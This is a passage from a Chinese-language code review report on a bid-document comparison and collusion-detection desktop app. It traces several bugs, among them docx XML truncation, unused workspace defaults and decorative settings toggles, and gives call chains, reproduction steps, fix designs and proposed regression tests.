方案 B(备选，成本更低但更脆)——缓存复制后按当前模板集重跑标记：在 persist_cached 里 copy_all 之后，对复制来的 chunks 用当前 chunker_opts.templates 重算 is_template/template_id 并 UPDATE。缺点：需把 templates 传进 persist_cached、对每块重跑 cosine(等于放弃复用该项的性能收益)，且 copy_all 已丢弃原始分词只存 token_json，需从 token_json 反解或重分词，复杂度反而接近方案 A 却只修一半(不覆盖'跨机器/历史指纹'语义)。推荐方案 A。

**钉死测试**

测试名 `cache_reuse_reflects_current_template_set`，放 src-tauri/src/services/import_service.rs 的 #[cfg(test)] mod tests(与 cross_workspace_reuses_parsed_chunks 同处，复用 write_min_docx/setup/ctx_for)。构造：设一段正文与内置样板 t-after 高度雷同(直接用 t-after 原文或余弦≥0.7 变体)；工作区 ws1 导入含该段的 docx(模板启用)→断言该段 chunk is_template=1；随后 template_repo::set_enabled(conn,"t-after",false)(或 delete)；工作区 ws2 导入同一文件(同 hash)。关键断言：ws2 文档 parse_method != "cache"(旧代码为 "cache"，修复后因指纹变了而重新解析)，且经 chunk_repo::load_for_compare 取回的对应段 is_template==false(旧代码仍为 true)。为直接钉死语义，可再加：以 CompareRequest{ignore_templates:true} 跑 compare_service，断言该段进入 comparable(旧代码被剔、修复后保留)。旧代码此断言必失败(copy_all 带回 is_template=1)，修复后通过。附一个对称用例 `cache_invalidated_when_template_added`(先无样板导入→加样板→再导入→断言段现被标 is_template 或至少缓存失效重算)。

**对原发现的修正**

机制、方向(漏报/误报双向)、严重级(CRIT)、默认命中(ignore_templates=true)均属实，行号需按当前代码更正：options_hash 主体在 import_service.rs:61-76(原发现引用一致)，但真正的模板注入点是 rs:99-114(list_enabled→ChunkerOptions.templates)、缓存命中在 rs:228-253、copy_all 在 chunk_repo.rs:146-211、消费点在 compare_service.rs:148——原发现只点了 rs:61-76 一处，其余需补齐才能动手。一处需澄清而非纠错：原描述聚焦'工作区A/工作区B'跨工作区触发，但 source_templates 是全局表(migrations.rs:218 无 workspace_id)，故本 bug 不以跨工作区为必要条件——单工作区'导入→改模板→同 hash 再导入'即触发，跨工作区(find_parsed_by_hash 无 ws 过滤)只是扩大了传播面。这不削弱 CRIT，反而提高可达性。非设计缺陷：V3 注释(migrations.rs:236-242)明确指纹意图是'配置不同则分块不可互换'，模板集正是这样一项配置输入却被遗漏，属实现遗漏而非有意设计。

---

## STRUCT 详解（结构性债务：不立刻坏但持续累积风险）

### S1 · docx XML 解析 Err(_)=>break 静默截断，残缺文本仍标 parsed，基准模式误报缺条

**级别** 🟠 STRUCT · **工作量** S

**位置**
- `src-tauri/src/engine/parse.rs:841 (docx_blocks 主循环 Err(_)=>break)`
- `src-tauri/src/engine/parse.rs:872 (fill_core Err(_)=>break)`
- `src-tauri/src/engine/parse.rs:899 (fill_app Err(_)=>break)`
- `src-tauri/src/engine/parse.rs:600 (parse_docx 消费 (blocks,legacy)，无截断校验)`
- `src-tauri/src/engine/parse.rs:624 (Ok(ParsedBlocks{..}) 正常返回)`
- `src-tauri/src/services/import_service.rs:291 (import_one 见 Ok(pb) 即走 parsed 路径)`
- `src-tauri/src/services/import_service.rs:342 (mark_parsed)`
- `src-tauri/src/db/repo/document_repo.rs:147-158 (mark_parsed 置 status='parsed', parse_error=NULL)`

**机制（逐环调用链）**

逐环调用链（全部核对当前代码属实）：
1) import_service.rs:270 import_one 调 parse::parse_file_blocks_opt → parse.rs:63 分发 docx → parse.rs:589 parse_docx。
2) parse.rs:598-600 read_zip 取出 word/document.xml（zip 层完好，字节读全），调 docx_blocks(&doc_xml)。
3) parse.rs:760 docx_blocks 进 read_event_into 主循环。当 quick_xml 在文档中段遇到病态 XML（标签不闭合/非法字符/引号不配对等）返回 Err，命中 parse.rs:841 `Err(_) => break`——直接跳出循环，报错点之后的 <w:p> 段落全部不再解析。此前已 push 的 blocks 与已拼的 legacy 原样留下。
4) parse.rs:846 `(blocks, legacy)` 正常返回（残缺），无任何错误信号。注意：这里的触发是「病态 XML」而非「XML 字节被截断到一半」——后者 quick_xml 通常在开标签未闭时也报 Err，同样命中此分支；纯粹良构但内容提前 EOF 会走 :840 Ok(Event::Eof)=>break（干净结束）。
5) 回到 parse_docx：parse.rs:620-622 若 app.xml 无 Pages，用 legacy_text 字数估算 pages（残缺文本→pages 偏小，但不报错）；parse.rs:624 组装 Ok(ParsedBlocks{blocks(残缺), pages, method:"docx", legacy_text(残缺)..})。fill_core/fill_app(:872/:899) 同构：指纹字段（作者/修订号/页数）在报错点后静默丢，指纹分析（围标线索）被削弱，同样无信号。
6) import_service.rs:284-291 match parsed 命中 Ok(mut pb) 分支：chunker::chunk 只对残缺 blocks 分块，char_count=残缺 legacy 字数（parse.rs:303），随后 persist_parsed（:309）→ mark_parsed（:342）。
7) document_repo.rs:158 mark_parsed 执行 `status='parsed', parse_error=NULL`——该份被当作完整解析成功，UI/报告无任何截断/缺文警示。与已修的扫描件超页截断（8766310，parse.rs:376-391 首插【查重提示】块）标准不一致：同类『内容未全部参与查重』风险，扫描件有醒目提示、病态 docx 完全静默。
8) 下游后果：compare_service.rs 基准模式下，被截断投标人缺失的条款在基准文档里存在→build_deleted(:707,:728) 产出 deleted 簇（『基准文档独有内容，其他文档未出现』），或基准被截断时缺失条款→其他文档独有→标 added(:462-464)。本应『同款条款』的却被误报为增删差异，命中核心价值观『宁转人工不误告』的反面。

**最小复现**

最小触发序列（评标真实场景）：
- 3 份同招标项目投标书（docx），其中投标人 B 的 document.xml 由非常规工具生成/二次编辑后 XML 层病态（例如某 <w:tbl> 段落中一处标签未正确闭合，或含未转义的裸 & / 控制字符），但外层 zip 完好（read_zip 能读全字节，不被拦下）。
- 选『基准模式』，以招标方范本或投标人 A 为基准导入比对。
- 现象：B 被正常标为『已解析(parsed)』，无 parse_error、无截断提示；B 病态点之后的全部条款（如报价表后半、技术方案后几章）未进语料。
- 结果：这些条款在基准中存在、在 B 中『缺失』→报告把它们列为 deleted/added 差异，评标人据此误判 B 漏应答/私改条款，实为解析截断。反向：若 B 恰为基准且被截断，其后半条款在 A/C 中『独有』→误报 added。
触发概率虽低于扫描件超页（需病态 XML），但一旦命中即静默产假差异，取证工具零容忍。

**影响面**

受影响：所有 .docx 输入路径（parse_docx 是 docx 唯一入口，含缓存 miss 的首次解析；命中 find_parsed_by_hash 的缓存复用会连同残缺分块一起复制，二次放大）。默认配置命中：是——Err(_)=>break 无开关，任何导入都走此路径，无需开 OCR 等选项。严重度：STRUCT 恰当——不 panic、不丢整份，但产出『看似成功实则残缺』的静默错误，且直接污染基准模式的 added/deleted 判定与指纹分析（fill_core/fill_app 截断削弱围标线索），违反『不误告/宁转人工』。附带损害：char_count（import_service.rs:303 由残缺 legacy 计）与 pages 估算（parse.rs:621）一并失真，字数校验/页数上报都被误导。发生频率：低-中——正常 Word/WPS 生成的 docx 极少病态；但对抗方『把差异藏在后半本』完全可以刻意构造病态 XML 触发静默截断，正是取证场景要防的攻击面。

**修复设计**（尚未落地）

目标：docx XML 解析遇 Err 不再静默吞，改为『显式标记截断→上报 parse_error/首插醒目提示』，与扫描件截断(parse.rs:376-391)对齐。不改文件，仅给设计：

方案A（推荐，最小侵入、与现有截断提示同构）：让 docx_blocks 返回是否发生 XML 错误，parse_docx 据此首插提示块并写指纹标记。
- docx_blocks 签名改 `-> (Vec<Block>, String, bool)`，最后一个 bool = xml_truncated。
  parse.rs:841 由 `Err(_) => break` 改为 `Err(_) => { xml_truncated = true; break; }`（循环前 `let mut xml_truncated=false;`），parse.rs:846 返回 `(blocks, legacy, xml_truncated)`。
- parse.rs:600 接收三元组；在 parse.rs:624 组装 ParsedBlocks 前，若 xml_truncated 则仿照 :377-391 `blocks.insert(0, Block{ text: "【查重提示】本文档 XML 结构异常，仅解析了部分内容，其余段落未参与查重，请人工复核并核对原文。".into(), heading_level:None, page:Some(1), is_table_row:false, is_list_item:false })`。提示文案不含可变数字即可（无需担心跨文档聚类，因文案统一；若担心与他文档同文聚成雷同簇，可拼入 file_name 或块数使各文档不同，与 :382 同思路）。
- 同步给 fill_core/fill_app：parse.rs:872/:899 各加一个 out bool（或复用同一 xml_truncated 语义），指纹截断时也并入同一提示/或在 fingerprint 里置一个 `parse_partial:true` 标志供报告展示。

方案B（更强，判『解析失败』走人工）：docx_blocks 遇 Err 直接使 parse_docx 返回 `Err("docx XML 结构异常，无法完整解析: <pos>")`。则 import_one match 命中 :285 Err(e)=>mark_failed，该份 status='failed'、parse_error 有值，UI 可见可重试。优点最保守（不误告）、与『宁转人工』最贴合；缺点：对『只是尾部一小段病态』的文档会整份判失败，可能损失可用的前半内容——取证语境下这是可接受甚至更优的取舍。建议：默认走方案A（保留已解析部分+醒目提示），若产品倾向零残缺则用方案B。

副作用/需一并改：
- docx_blocks 有 4 处调用（parse.rs:600 生产路径 + 测试 :970/:1247/:1265/:1289）。改签名后测试需同步解构新元组（`let (blocks, legacy, _)=docx_blocks(..)`）。
- 无需 DB 迁移：parse_error 列(migrations.rs:59)、mark_failed(document_repo.rs:185) 均已存在；方案A 甚至不碰 DB（只多一个块）。方案B 复用现成 mark_failed 路径。
- 文档/注释：更新 docx_blocks 头注释(parse.rs:734-737)说明『XML 错误不再静默截断』；若采纳方案A，在 parse.rs:376 附近注释群里补一句 docx 与扫描件截断同标准。
- 缓存路径(import_service.rs:231 find_parsed_by_hash)天然受益：一旦首次解析带提示块/或判 failed，缓存复用同样带上，不需额外改。

**钉死测试**

放 src-tauri/src/engine/parse.rs 的 #[cfg(test)] mod tests（紧邻现有 docx_blocks_extract_heading_levels，:960 附近）。
测试名：`docx_blocks_flags_truncation_on_malformed_xml`。
构造：良构前缀 + 中段病态 XML + 尾部本应解析的段落，例如：
```
let xml = r#"<?xml version=\"1.0\"?>
<w:document xmlns:w=\"...main\"><w:body>
<w:p><w:r><w:t>前半条款 报价1280万元</w:t></w:r></w:p>
<w:p><w:r><w:t>坏点 & 未转义</w:t></w:r></w:badtag>
<w:p><w:r><w:t>后半条款 工期90天</w:t></w:r></w:p>
</w:body></w:document>"#;
```
（裸 & 或错配闭合标签使 quick_xml 报 Err。）
关键断言（旧代码失败、修复后通过）：
- 方案A：`let (blocks, _legacy, truncated) = docx_blocks(xml.as_bytes()); assert!(truncated, "病态 XML 应标记截断");` 且 `assert!(blocks.iter().all(|b| !b.text.contains("工期90天")), "报错点后段落确实丢失");`（证明确有截断，非误判）。旧代码返回二元组、无 truncated 标志→编译/断言失败。
- 或走 parse_docx 层的集成断言：对上述 XML 打包成最小 docx 后 `parse_docx(..)` 的 blocks[0].text 含『XML 结构异常』提示（方案A），或 `parse_file_blocks` 返回 Err（方案B）。
- 补一条回归保护：良构 XML（现有 docx_blocks_extract_heading_levels 的 xml）应 `assert!(!truncated)`，确保正常文档不被误标。

**对原发现的修正**

机制与位置全部属实，行号精确无偏移（当前代码 :841/:872/:899 就是三处 `Err(_) => break`，:600 消费元组、:624 Ok 返回、import_service.rs:291/:342 走 parsed）。两点补充精化（非推翻）：(1) 触发条件应表述为『病态/非良构 XML』而非泛化的『XML 层截断』——纯字节截断到良构边界会命中 :840 Ok(Event::Eof)=>break 干净结束；但字节截断到开标签中段同样使 quick_xml 报 Err 命中 :841，故『XML 层截断后重打包』仍属实，只是根因是解析器判非良构。(2) 原发现未提及的附带影响：截断同时污染 char_count(import_service.rs:303) 与 pages 估算(parse.rs:621)，以及 fill_core/fill_app 截断会静默削弱指纹（围标线索），可一并纳入 blast radius。严重级 STRUCT 判定准确，不宜降级——静默产假 added/deleted 差异正是取证工具的实质缺陷。不是设计（对照 8766310 扫描件截断已有醒目提示，此处静默属遗漏而非有意设计）。

---

### S2 · 「保存为本工作区默认」六字段在比对链路零生效（前端预填从不读 workspace.settingsJson + onStart 显式传全部 compare 字段，后端 unwrap_or 永走 request 分支）

**级别** 🟠 STRUCT · **工作量** S

**位置**
- `src/screens/CompareSetup.tsx:57-74（预填 effect，只读 cfgRaw/app_settings）`
- `src/screens/CompareSetup.tsx:156-166（onStart 对 6 个 compare 字段全部显式传值，从不 undefined）`
- `src/screens/CompareSetup.tsx:174-192（saveAsWorkspaceDefault：只写 compare patch，toast「已保存为本工作区默认」）`
- `src/screens/CompareSetup.tsx:35,209（ws=useWorkspace 已取到但只用 ws?.name，settingsJson 未消费）`
- `src/screens/Running.tsx:43-56（重试从 job.configJson 重发，同样把 6 字段显式带上）`
- `src-tauri/src/commands/compare.rs:63-89（effective_config 只做 unwrap_or fallback）`
- `src-tauri/src/commands/mod.rs:21-33（effective_config 正确读 settings_json 并 resolve(user,ws,None)）`
- `src-tauri/src/config.rs:140-152（4 层 resolve，分层合并正确）`

**机制（逐环调用链）**

逐环调用链（触发点→错误结果，均以当前 main@4078315 代码核对属实）：
1) 用户在 CompareSetup 调好 6 项检测设置，点「保存为本工作区默认」→ saveAsWorkspaceDefault (CompareSetup.tsx:174) 组装 patch={compare:{scope,defaultChunkLevel,similarityThreshold,enableSemantic,enableFactConflict,ignoreTemplates}} → setWorkspaceSettings(wsId, JSON.stringify(patch)) (行187) → api/index.ts:32 call('set_workspace_settings') → commands/workspace.rs:42 set_workspace_settings → config::resolve 校验通过 → workspace_repo::set_settings 落库 workspaces.settings_json。写入成功，toast「已保存为本工作区默认设置」(行188)。此环真实生效——数据确实入库。
2) 用户下次进入本工作区新建查重（或刷新页面重挂载 CompareSetup）→ 预填 effect (CompareSetup.tsx:57-74) 触发。该 effect 的依赖只有 [cfgRaw, cfgApplied]，effect 体内只解析 cfgRaw（= useAppSettings()=get_app_settings，即 app_settings 用户全局层，data.ts:363, api/index.ts:121）的 compare patch 去 setState。ws.settingsJson（工作区层）在整个 src/ 里除写入路径外零读取方（grep 证实：settingsJson 仅出现在 api/index.ts 的 setter 与 api/types.ts 类型定义）。→ 结果：刚保存的工作区默认不会回填到 UI 控件，UI 仍显示全局默认/内置默认。
3) 用户点「开始交叉比对」→ onStart (CompareSetup.tsx:149) → startCompare.mutateAsync({... 行160-165 对 chunkLevel/enableSemantic/enableFactConflict/ignoreTemplates/similarityThreshold/scope 全部用当前 state 显式取值，均为具体值、绝不为 undefined ...}) → api.startCompare → commands/compare.rs:37 start_compare。
4) start_compare 行63 cfg_all=effective_config(state,wsId)：此函数(commands/mod.rs:21-33)确实读 ws.settings_json→ws_patch，调 config::resolve(user, ws_patch, None) 得到含工作区层的 d=cfg_all.compare。但行65-89 每个字段都是 request.x.unwrap_or(d.x)：因 request 的这 6 个字段全是 Some(...)（第3步显式传值），unwrap_or 恒取 request 分支，d（含工作区层）被完全跳过。→ 结果：工作区保存的 6 项对本次比对零影响。
5) 重试路径同理：Running.tsx:43-56 从 job.configJson（= run 序列化，即上次 start 的解析后 CompareRunConfig，字段全具体）JSON.parse 后再把 6 字段显式带回 startCompare，同样恒走 request 分支。
结论：'保存'→'落库'真实，但'落库'→'下次预填'与'落库'→'比对生效'两环全断。CRIT 已正确降 STRUCT：UI 显示值=实际执行值（都来自 request），config_json 记录的是真实 request 配置，无隐藏背离；损害是功能承诺落空+误导性成功 toast，非取证结果失真。

**最小复现**

最小复现（评标真实场景）：
评标员本轮要连查同一采购项目下 4 个标段，每标段一个工作区，各 5 份投标人标书。他按机构口径把检测设置调成：比对范围=仅技术标、分块粒度=句子、相似度阈值=85%、语义查重=开、忽略查重源样板=开（区别于内置的 完整标书/段落/70%/关/开）。
步骤：
1. 工作区A 里调好上述 5 项，点「保存为本工作区默认」，看到绿色 toast「已保存为本工作区默认设置」。
2. 勾选 5 份→「开始交叉比对」。观察：本次比对用的仍是全局/内置默认（范围=完整标书、粒度=段落、阈值=70%、语义=关），而非他刚存的工作区值。
3. 回到工作区A（或刷新页面）再新建一次查重。观察：检测设置面板仍显示全局/内置默认，他保存的工作区默认没有回填任何一个控件。
预期：保存后本工作区内新建/重试的比对应默认采用这 5 项；实际：保存动作对预填和比对双双零生效，评标员误以为已按机构口径设置，可能用错阈值/范围出报告。

**影响面**

受影响：所有使用「保存为本工作区默认」按钮的评标用户（该按钮在每个 CompareSetup 检测设置卡片底部，是常规可见入口）。严重度：功能完全断链（六字段全部无效），且成功 toast 具误导性，用户会形成'已按本工作区口径固化设置'的错误信任，进而每次仍在用全局/内置默认跑比对（范围=完整标书、粒度=段落、阈值=70%、语义=关、事实冲突=开、忽略样板=开）而不自知。默认配置是否命中：命中——任何点了该按钮的工作区都命中，无需特殊配置。发生频率：每次'保存工作区默认后期望其在比对/预填生效'都必现（100%）。缓解面：UI 显示值=实际执行值、config_json 忠实记录 request，故不产生取证结果失真或隐藏背离，核心'宁转人工不误告/可举证'价值观未被破坏——这是降为 STRUCT 的正当理由。附带事实：后端工作区层并非全死，export_service.rs:216-220 会消费 workspace 的 export.* 子配置；但本按钮只写 compare.*，与 export 无关，故对本按钮而言六字段确为零生效。

**修复设计**（尚未落地）

根因是前端缺一环'工作区层→UI 预填'，加上'onStart 无条件显式传值抹掉后端 fallback'。推荐纯前端修复（后端分层已正确，无需动 Rust）：
方案A（推荐，最小）——让预填 effect 叠加工作区层，工作区覆盖全局：
在 CompareSetup.tsx 把预填 effect 改为消费两层。ws 已在行35 取到（含 settingsJson）。
  // 抽一个 applyComparePatch(cmp) 复用现有 64-71 的 setter 逻辑
  const applyComparePatch = (cmp: Record<string, unknown> | undefined) => { if(!cmp) return; if(typeof cmp.enableSemantic==='boolean') setSemantic(cmp.enableSemantic); ... 同现行 64-71 ... };
  useEffect(() => {
    if (cfgApplied || cfgRaw === undefined || ws === undefined) return; // 两层都就绪才填一次
    const pick = (raw:any)=> raw && typeof raw==='object' ? raw.compare : undefined;
    applyComparePatch(pick(cfgRaw));                       // 全局层
    let wsCmp; try { wsCmp = ws.settingsJson ? pick(JSON.parse(ws.settingsJson)) : undefined; } catch { wsCmp = undefined; }
    applyComparePatch(wsCmp);                              // 工作区层后应用→覆盖全局
    setCfgApplied(true);
  }, [cfgRaw, ws, cfgApplied]);
注意：依赖数组要加 ws；gate 改成 cfgRaw!==undefined && ws!==undefined，避免只填到一层就 setCfgApplied(true) 卡死（当前 gate 仅等 cfgRaw）。ws.settingsJson 可能非法 JSON→try/catch 静默降级到全局层。这样预填正确后，onStart 显式传的就是'工作区默认'派生值，比对自然生效，无需改 unwrap_or 语义。
方案B（更彻底但改动大）——后端加 resolved-config 查询（如复用 effective_config 暴露 get_effective_compare_config(wsId) command），前端初始化直接拿合并结果填 UI；同时可让 onStart 仅对'用户实际改动过的字段'传值（差量），真正利用后端四层。改动波及 commands 层 + 前端 dirty 追踪，成本高，非必要。
副作用/需一并改：
- 方案A 不改任何后端、不需迁移号、不动 DB。
- 需同步的注释：CompareSetup.tsx:56 注释'用户全局默认值(DB)就绪后填充一次'应改为'用户全局<工作区两层合并后填充一次'；行173 saveAsWorkspaceDefault 上方注释'覆盖用户全局，被单次任务设置覆盖'在修复后才成立，无需改文字但需知其此前不实。
- 边界：现有'首批解析全选'等其它 effect 不受影响；basedoc/taskName 不在保存范围，无需动。
- 【本次不改任何文件，仅为修复设计】。

**钉死测试**

放 src/screens/__tests__/CompareSetup.prefill.test.tsx（若无该目录则新建；项目若用 vitest+@testing-library/react 则沿用）。测试名：'工作区 settingsJson 的 compare 覆盖全局默认并预填到检测设置'。
关键断言：mock useAppSettings 返回 {compare:{scope:'full',similarityThreshold:0.7}}（全局），mock useWorkspace 返回 {name:'x', settingsJson: JSON.stringify({compare:{scope:'tech',similarityThreshold:0.85,defaultChunkLevel:'sentence',enableSemantic:true}})}。渲染 CompareSetup 后断言：比对范围 SegControl value 对应'仅技术标'(scopeIdx===1)、相似度阈值 label 文案含'85%'、分块粒度对应'句子'(levelIdx===2)、语义查重 Toggle on===true。旧代码这些断言全失败（预填只读全局，仍显示 完整标书/70%/段落/关），修复后通过。
可选第二测试（钉比对生效）：'onStart 在有工作区默认时把工作区值带入 startCompare'——mock startCompare.mutateAsync，点击'开始交叉比对'，断言入参 scope==='tech' && similarityThreshold===0.85 && enableSemantic===true。旧代码传的是 full/0.7/false→失败；修复后通过。

**对原发现的修正**

原发现基本准确，修正三处细节：(1) 行号需微调——预填 effect 实为 CompareSetup.tsx:57-74、onStart 显式传值实为 156-166、saveAsWorkspaceDefault 实为 174-192、Running 重试实为 43-56（与原描述基本一致，此处按当前代码钉死）。(2) '工作区层全前端零读取方'表述对该按钮成立，但需补一处后端事实：工作区 settings_json 层在后端并非完全无消费——export_service.rs:216-220 会用它 resolve export.* 子配置，且 effective_config(commands/mod.rs:21-33) 确实正确读取并 resolve 了工作区层；断链点纯在前端（预填不读 + onStart 无条件显式传值抹掉 fallback），后端四层 resolve 本身正确。故本条准确定位应为'前端功能断链'而非'后端不支持工作区层'。(3) 严重级 STRUCT 判定正确、无需调整：UI 显示=执行值、config_json 忠实，无取证失真，仅功能承诺落空+误导 toast。非'其实是设计'——config.rs:1 与 commands/compare.rs:18 注释明确声明'工作区层应作为默认回落'，即设计意图是要生效的，当前实现未兑现，属真实缺陷。

---

### S3 · 两个伪开关(flagCollusion/industryLink)只写 localStorage 无消费方，关掉「围标嫌疑提示」报告仍出围标结论

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** S

**位置**
- `src/screens/Settings.tsx:253`
- `src/screens/Settings.tsx:262`
- `src/prefs.ts:9`
- `src/prefs.ts:10`
- `src/prefs.ts:22`
- `src/prefs.ts:23`
- `src-tauri/src/commands/compare.rs:21`
- `src-tauri/src/services/compare_service.rs:325`
- `src/screens/Matrix.tsx:121`
- `src/screens/JobsList.tsx:63`
- `src/screens/Export.tsx:274`

**机制（逐环调用链）**

逐环调用链（均已 Read 当前代码核实）：
1) 触发点 · UI 写入：Settings.tsx:253 `<Toggle on={s.flagCollusion} onChange={()=>change({flagCollusion:!s.flagCollusion})}/>`，Settings.tsx:262 同理写 industryLink。change() = Settings.tsx:125 `setSettings(patch)` → prefs.ts:40-48 仅 `localStorage.setItem('bidguard-settings', ...)`。两个字段从此只躺在 localStorage。
2) 消费缺失：全库 grep `flagCollusion|industryLink|flag_collusion|industry_link` 仅命中 prefs.ts（定义+默认值）与 Settings.tsx（两个 Toggle），别无他处；Rust 端零命中。`getSettings()` 的调用方只有 3 处：main.tsx:59（只读 autoClean）、prefs.ts 内部、Settings.tsx:124。两开关无任何读取方。
3) 后端无条件算围标：CompareRequest 结构体 compare.rs:21-34 没有任何 collusion 开关字段；CompareRunConfig compare.rs:73-91 也不带。compare_service.rs:325-326 `let collusion = collusion::assess_with(peak, &r_clusters, &doc_infos, &r_shared, &price_pairs);` 无条件计算，363 行 `set_compare_results(..., &serde_json::to_string(&collusion)...)` 无条件落库 collusion_json。
4) 前端无门控展示：Matrix.tsx:121 `const collusion = sm.collusion as ... Collusion|undefined;` → 122 `level = collusion?.level ?? 'none'` → 155-156 直接渲染 `statement`/峰值结论，全程不读 flagCollusion。旁路两处同样无门控：JobsList.tsx:63 `needsReview = j.collusionLevel==='high'||'medium'`（列表「需复核」徽标）、Export.tsx:274 `level = data.job.collusionLevel ?? 'none'`（导出报告）。
结论：用户在设置里关掉「围标嫌疑提示」后，任务详情 Matrix、列表徽标、导出报告仍照常给出围标 level/结论——开关是纯装饰。industryLink 同理，永不参与判定。

**最小复现**

最小复现：导入 3 份及以上不同投标人标书（例：3 份 25 页扫描件，其中 2 份大段条款雷同、报价金额接近但不同 → 后端 collusion::assess_with 判为 medium/high）。① 进「设置 → 检测偏好」，把「围标嫌疑提示」开关关掉（s.flagCollusion=false，落 localStorage）。② 回到任意工作区发起交叉比对。③ 打开任务详情 Matrix 页：仍显示「X、Y 等标书 疑似围标」结论与信号洞察；返回任务列表：该任务仍挂「需复核」徽标；导出报告：仍含围标章节与 level。开关关了但围标结论一个没少。industryLink：无论开关如何，工商联动永不发生（本就无数据源接入），开关纯占位。

**影响面**

影响面：所有做交叉比对的评标用户（本产品唯一核心流程）。严重度：STRUCT——直接违背产品「宁转人工不误告」价值观且构成误导性承诺：审查员以为已关闭围标提示、据此认为报告不含围标结论，实际报告仍白纸黑字写「疑似围标」，可能被当作举证依据对外出具，属信任面缺陷而非崩溃。默认配置命中：DEFAULT_SETTINGS.flagCollusion=true（prefs.ts:22），默认开着时行为与「无开关」一致、无人察觉；真正踩雷是用户主动关闭后——这是开关唯一存在的意义，却完全失效。industryLink 默认 false（prefs.ts:23），副标题自带「未配置时不参与判定」免责，误导较弱。发生频率：只要用户动过「围标嫌疑提示」开关就必现，100% 可复现。

**修复设计**（尚未落地）

推荐方案 B（对齐 e33b143 既定「去伪开关」先例，最小且不引后端改动）。参考：e33b143 已把「本地优先模式」恒开伪开关改成静态「始终启用」文案，本条是同类漏网。

【方案 B · 删开关 + 清死字段，保留 autoClean】
1) Settings.tsx：删除 252-263 两行 Row（围标嫌疑提示 / 联动工商关联）。删后「语义模型」Row 变末行——注意 last 属性：当前 industryLink Row 带 `last`，删除后需把其上方仍存在的最后一个可见 Row 补 `last`（此处即分块/召回段之后的语义相关 Row 链，实际末行为条件渲染的「语义模型」，为稳妥应给「语义查重」Row（222-227）或紧邻的固定末行补 last，避免底部多一条分隔线）。
2) prefs.ts：Settings 接口删 `flagCollusion`(9)、`industryLink`(10)；DEFAULT_SETTINGS 删 22、23 两行。
3) 顺带清理真死字段（可选、同一改动内）：`getSemantic`(51-53)/`setSemantic`(54-56) 确为死代码（CompareSetup 的 setSemantic 是本地 useState，非此函数）——可删。但 semantic/scope/threshold/ignoreTemplates 四字段【不可删】：main.tsx:44-49 迁移逻辑仍读 `old.scope/old.threshold/old.ignoreTemplates/old.semantic`（从旧 localStorage blob 迁到 DB），删了会破坏老用户一次性迁移。若要删需同步改 main.tsx 迁移读取——不建议纳入本条。
副作用：老用户 localStorage 里残留的 flagCollusion/industryLink 键无害（getSettings 用 {...DEFAULT,...JSON} 合并，多余键被忽略），无需迁移号。无 i18n 文案外泄。

【方案 A · 真接线（仅当产品确认要保留门控）】改动更大：CompareRequest+CompareRunConfig 加 `enable_collusion:Option<bool>`，compare_service.rs:325 包 if，且需决定关闭时 collusion_json 存 null 还是 level='none'；Matrix/JobsList/Export 三处消费方对 null 已能回落 'none'。但这会把「用户可关闭围标检测」变成产品承诺，与「宁转人工不误告」张力较大，且 industryLink 无数据源无法真接线，只能删。故推荐 B。
【不修改任何文件——以上仅为修复设计。】

**钉死测试**

因两开关无运行时消费方，纯 UI 存在性无法用行为断言钉死，改用「防回归契约测试」锁住『关闭 flagCollusion 不得改变围标结论』这一真实语义，旧代码与修复后均应通过、且能防止未来有人把开关错误接成假门控：
新增 src/prefs.test.ts（vitest，与既有 src/utils/*.test.ts 同风格）：
- 测试名 `flagCollusion/industryLink 已从检测偏好中移除（去伪开关）`
- 关键断言：`expect('flagCollusion' in DEFAULT_SETTINGS).toBe(false)`、`expect('industryLink' in DEFAULT_SETTINGS).toBe(false)`——该断言在当前(旧)代码失败（两键仍在 DEFAULT_SETTINGS，prefs.ts:22-23），方案 B 修复后通过。
- 补充断言（可选，锁 API 死代码）：`expect((mod as any).getSemantic).toBeUndefined()`。
若走方案 A，则改为在 compare_service 层加 Rust 单测：构造关闭 collusion 的 CompareRunConfig，断言 collusion_json 为 none/null——放 src-tauri/src/services/compare_service.rs 既有 #[cfg(test)] 模块（该文件 1295 行已有 collusion_pipeline_on_generated_bids_v2 测试可参照）。

**对原发现的修正**

1) prefs 文件路径修正：原发现写 src/lib/prefs.ts，实际在 src/prefs.ts（无 lib 目录），行号 253/262 当前属实。2) 「附带 prefs 死字段 semantic/scope/threshold/ignoreTemplates」表述不够准确：这四个字段并非完全死字段——main.tsx:44-49 的 migrateLegacyPrefs 一次性迁移仍读取 old.scope/old.threshold/old.ignoreTemplates/old.semantic 写入 DB compare 配置，删除会破坏老用户迁移路径，不能与两个真伪开关一并删。真正无任何消费方的是 flagCollusion、industryLink 两字段，以及 getSemantic/setSemantic 两个便捷函数（CompareSetup.tsx:47/366 的 setSemantic 是组件本地 useState，与 prefs 的 setSemantic 无关）。3) 其余机制（无消费方、后端无条件算围标 compare_service.rs:325、Matrix.tsx:121 无门控展示、industryLink 副标题自带免责而 flagCollusion 无提示误导更强、e33b143 去伪开关先例）经逐环 Read 核实全部属实。严重级 STRUCT 恰当（信任面/误导性承诺，非崩溃）。

---

### S4 · 导入期文档列表"轮询兜底"失效：useDocuments 双通道退化为终态事件单点

**级别** 🟠 STRUCT · **工作量** S

**位置**
- `src/queries/data.ts:108-117 (useDocuments，refetchInterval 谓词在 113-115)`
- `src/queries/data.ts:229-238 (useImportDocuments.onSuccess invalidate documents/jobs)`
- `src/stores/progressStore.ts:40-44 (progress 事件只写 zustand，不碰 query cache)`
- `src/stores/progressStore.ts:45-67 (仅 TERMINAL 事件失效 ["documents"]，56-57)`
- `src-tauri/src/commands/document.rs:16-44 (import_documents 立即 spawn 返回 JobRow)`
- `src-tauri/src/jobs/mod.rs:170-227 (spawn 建 pending 任务→spawn_blocking→立即返回)`
- `src-tauri/src/services/import_service.rs:184-192,255-267 (create_parsing 在并行 import_one 内，命令返回后才 INSERT status='parsing')`
- `src-tauri/src/jobs/progress.rs:9-17,42-73 (JobProgress 只含 jobId/stage/percent，无文档行)`
- `src/main.tsx:28 (refetchOnWindowFocus:false 全局)`

**机制（逐环调用链）**

逐环调用链，均已对当前代码核实：
(1) 用户导入 → CompareSetup.tsx:118 doImport → useImportDocuments.mutate（data.ts:229-238）→ api.importDocuments → Rust import_documents（document.rs:16-44）。
(2) import_documents 只做 workspace 校验 + ImportOptions 快照，然后 state.jobs.spawn(...)（document.rs:35-43）。spawn（jobs/mod.rs:183-198）在一个 IMMEDIATE 事务里创建 job 行（status=pending），随即 tauri::async_runtime::spawn_blocking 把 run_import 丢到阻塞线程池（mod.rs:209-225），**立即 Ok(job) 返回**。此刻数据库里还没有任何 documents 行。
